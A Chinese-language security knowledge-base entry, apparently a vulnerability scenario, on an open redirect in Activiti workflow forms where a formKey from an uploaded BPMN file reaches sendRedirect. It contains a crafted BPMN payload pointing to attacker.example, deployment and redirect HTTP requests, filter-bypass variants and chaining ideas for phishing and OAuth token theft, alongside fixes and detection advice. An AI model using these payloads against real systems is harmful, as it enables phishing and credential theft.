---
id: web-generic-open-redirect-activiti-formkey-sendredirect
title: Activiti 工作流表单 formKey 未校验：上传 BPMN 控制 formKey 触发 sendRedirect 开放重定向
type: scenario
domain: web
path: web/generic/open-redirect
technique: activiti-formkey-sendredirect-open-redirect
tags:
- web
- open-redirect
- activiti
- workflow
- java
- bpmn
- phishing
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V176
  verified_at: '2026-11-06T11:38:57+08:00'
  notes: 已对照原文与图04/05核对：BPMN 上传 evil.bpmn，userTask activiti:formKey=http://baidu.com/workflow/audit/，部署响应流程ID=testRedirect:5:302521，GET /activiti/task/form/testRedirect:5:302521/task 返回 302 Location=http://baidu.com/workflow/audit/task；原理、触发条件与利用步骤一致。未验证点：未本机复跑；原文未给 Activiti/应用版本、BPMN 元素写法以图04 为准；frontmatter 无 sources/source_url。
url: /docs/web/generic/open-redirect/web-generic-open-redirect-activiti-formkey-sendredirect/
draft: false
kb_aliases:
- formKey 开放重定向
- actTaskService getFormKey
- TaskController formKey sendRedirect
- Activiti 表单跳转漏洞
- BPMN formKey 注入
---

## 一句话结论

工作流表单接口从 BPMN 流程定义中取 `formKey`，直接拼成 `response.sendRedirect(formKey + "/" + taskId)` 返回 302；攻击者只要能把 `activiti:formKey` 写成外部 URL 并部署流程，就能让 `/activiti/task/form/{procDefId}/{taskId}` 跳转到任意外部站点。

## 原理

- **formKey 是流程定义里的可控字段**：Activiti/Flowable 的 BPMN XML 允许在 `userTask` 上通过 `activiti:formKey` 指定表单地址。流程部署接口接收 BPMN 文件并解析，`actTaskService.getFormKey(procDefId, taskId)` 之后从流程定义中读取该值。
- **拼接后直接 sendRedirect**：漏洞代码为 `response.sendRedirect(formKey + "/" + taskId)`。`sendRedirect` 接受绝对 URL 时会生成指向外部站点的 `Location` 头；代码没有校验 `formKey` 必须是本站相对路径，也没有限制协议、主机或前导 `//`。
- **部署接口提供攻击入口**：流程部署通常以 multipart 上传 BPMN 文件（原文请求包含 `file=evil.bpmn`、`category=123`），部署成功后返回流程定义 ID（如 `testRedirect:5:302521`）。只要攻击者拥有流程设计/部署权限，或部署接口暴露且未严格鉴权，就能把恶意 `formKey` 写入流程定义。
- **触发路径**：访问 `/activiti/task/form/{procDefId}:{version}:{id}/{taskId}` 时，服务端根据流程定义取 formKey 并重定向；原文请求 `GET /activiti/task/form/testRedirect:5:302521/task` 返回 `302 Location: http://baidu.com/workflow/audit/task`，证明可跳转到外部域名。
- **影响**：开放重定向本身可用于钓鱼（伪装成可信业务域名跳转到钓鱼站）、OAuth/SSO 授权码或 token 窃取（若与回调校验不严的流程组合）、绕过邮件/IM 链接白名单等；单独看危害为中等，但在信任度高的内部工作流域名上更容易欺骗用户。

## 触发条件

- 目标使用 Activiti/Flowable 等 BPMN 工作流引擎，并存在按 `procDefId`/`taskId` 读取 `formKey` 后重定向的表单接口（常见路径 `/activiti/task/form/...`）。
- 攻击者能够部署/上传 BPMN 流程定义：拥有工作流设计权限，或部署接口未授权/鉴权薄弱。
- 恶意流程已部署并可启动，攻击者能获得或枚举流程定义 ID 与任务 ID；原文部署响应直接返回流程 ID，任务 ID 使用 `task`。
- 服务端未对 formKey 做相对路径/域名白名单校验。

## 利用步骤

1. 构造 BPMN XML，在 `userTask` 上写入外部 `activiti:formKey`：
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
                xmlns:activiti="http://activiti.org/bpmn"
                targetNamespace="http://activiti.org/test">
     <process id="testRedirect" name="Test Redirect Process" isExecutable="true">
       <startEvent id="start" name="Start"/>
       <userTask id="task" name="审批任务"
                 activiti:formKey="http://attacker.example/phish"/>
       <endEvent id="end" name="End"/>
       <sequenceFlow id="flow1" sourceRef="start" targetRef="task"/>
       <sequenceFlow id="flow2" sourceRef="task" targetRef="end"/>
     </process>
   </definitions>
   ```
2. 通过流程部署接口上传该 BPMN（原文为 multipart，字段 `file`，可带 `category`），记录返回的流程定义 ID，例如 `testRedirect:5:302521`。
3. 确保流程实例/任务存在（或直接使用部署后生成的任务），访问：
   ```
   GET /activiti/task/form/testRedirect:5:302521/task HTTP/1.1
   Host: target.example:8090
   ```
4. 服务端返回：
   ```
   HTTP/1.1 302
   Location: http://attacker.example/phish/task
   ```
   浏览器跟随跳转到攻击者站点；后续可结合钓鱼页、OAuth 回调或 token 窃取利用。
5. 若目标对 `formKey` 有部分过滤，可尝试 `//attacker.example`、`https://attacker.example`、大小写/编码变体或带用户信息的 URL 绕过。

## PoC

原文给出了完整的部署请求与 302 响应（图片核对）：

```http
POST /activiti/... HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="category"

123
------WebKitFormBoundary...
Content-Disposition: form-data; name="file"; filename="evil.bpmn"
Content-Type: application/octet-stream

<BPMN XML，formKey 为外部 URL>
------WebKitFormBoundary...--
```

```http
HTTP/1.1 200
{"msg":"部署成功, 流程ID=testRedirect:5:302521","code":0}
```

```http
GET /activiti/task/form/testRedirect:5:302521/task HTTP/1.1
Host: 192.168.0.103:8090

HTTP/1.1 302
Location: http://baidu.com/workflow/audit/task
Content-Length: 0
```

## 变体与关联

- 变体：formKey 换成 `//attacker.example`（协议相对）、`https://attacker.example`、带 `@` 的 URL 或编码后的绝对地址；不同工作流引擎（Flowable、Camunda）对 formKey 的解析和重定向方式可能类似。
- 组合利用：开放重定向 + OAuth/SSO 回调校验不严可窃取授权码/token；+ 钓鱼页可借助内部工作流域名的信任提升点击率；+ 邮件/IM 链接白名单可被绕过。
- 关联：[[web-generic-open-redirect-shiro-login-redirect-host-header]]（Host 头注入重定向）、[[web-generic-open-redirect-webob-whitespace-urljoin-mismatch]]（空白/协议相对 URL 绕过）、[[web-generic-sqli-bootdo-sort-order-token]]（同属工作流/后台系统的常见 Java 漏洞面）。

## 检测与防御

- **代码修复**：不要直接 `sendRedirect(formKey + "/" + taskId)`；只允许服务端生成的相对路径，或对 formKey 做 `URI` 解析并校验 scheme 为空/`http(s)`、host 属于白名单、路径不以 `//` 开头；更安全的做法是按 formKey 查内部表单映射表，而不是把它当 URL。
- **部署接口**：限制 BPMN 部署/上传权限到受信任的管理员或流程设计者；对部署接口做鉴权、CSRF 防护与文件类型校验；审计新增流程定义中的外部 `formKey`。
- **检测**：监控 `GET /activiti/task/form/...` 返回的 302 `Location` 是否指向外部域名；审计 BPMN 部署请求与流程定义 XML 中的 `http://`/`https://`/`//` formKey；静态分析跟踪 `getFormKey` → `sendRedirect` 的污点路径。
- **运营**：对内部工作流域名做链接信誉保护；用户培训中提示“内部系统跳转到外部站点”的风险；结合 OAuth/SSO 的回调白名单校验，避免重定向被用于 token 窃取。
